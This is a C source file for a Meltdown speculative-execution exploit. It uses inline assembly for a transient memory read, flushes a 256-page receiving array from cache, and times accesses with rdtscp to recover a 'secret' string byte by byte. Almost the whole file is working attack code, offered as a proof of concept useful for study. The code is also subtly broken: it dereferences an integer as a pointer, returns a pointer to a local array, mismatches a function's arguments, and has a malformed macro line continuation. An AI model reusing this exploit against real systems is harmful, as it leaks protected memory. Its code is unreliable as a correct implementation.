/*
	main c file
*/
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "urd00m_output.h"
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define DEBUG 1

#if DEBUG 
#define MELTDOWN(addr) \
  INFO("Meltdown running\n"); \
  asm("1:\n movzx (%%rcx), %%rax\n" \
      "shl $12, %%rax\n" \
      "jz 1b\n" \
      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
      :						\
      : "c"(addr), "b"(rec)			\
      : "rax");
#else
#define MELTDOWN(addr) \
  asm("1:\n movzx (%%rcx), %%rax\n" \
      "shl $12, %%rax\n" \
      "jz 1b\n" \
      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
      :						\
      : "c"(addr), "b"(rec)			\
      : "rax");
#endif 

/*
  Global vars 
 */
int * rec; 
char secret[100] = "hello world\n";

/*
  Meltdown setup code 
 */
void init() {
  // setup recieving array 
  rec = (int *) malloc(sizeof(*rec) * 300 * 4096); // page stride
  for(int i = 0; i < 256; i++) {
    _mm_clflush(&rec[i * 4096]); //flush it from memory 
  }

  INFO("Init finished\n");
}

int read_byte_from_reciever() {
  int junk = 0;
  int min_value = 1000; //which ever one has the lowest time to access
  int min_idx = -1; 
  for(int i = 0; i < 256; i++) {
    // timing
    uint64_t addr = &rec[i * 4096];
    int start = __rdtscp(&junk);
    junk = *addr;
    int elapsed = __rdtscp(&junk) - start;

    // check time 
    if(elapsed < min_value) {
      min_value = elapsed;
      min_idx = i;
    }
  }

  // flush everything
  for(int i = 0; i < 256; i++) {
    _mm_clflush(&rec[i * 4096]);
  }

  #if DEBUG
  INFO("byte value read: %d\n", min_idx);
  #endif
  
  return min_idx;
}


char* read_string(char* addr) {
  char ret[100] = "";

  MELTDOWN(addr); 
  char byte_value = (char)read_byte_from_reciever(addr);
  while(byte_value) {
    strncat(ret, &byte_value, 1); //concatenate strings
    addr++;
    MELTDOWN(addr);
    byte_value = (char)read_byte_from_reciever(addr);
  }
  
  return ret; 
}

/*
  Main function
*/
int main(void) {
  // create reciever 
  init();

  // attempt read
  char *guess = read_string(secret);
  ERROR("String is: %s", guess);
  
  return 0;
}
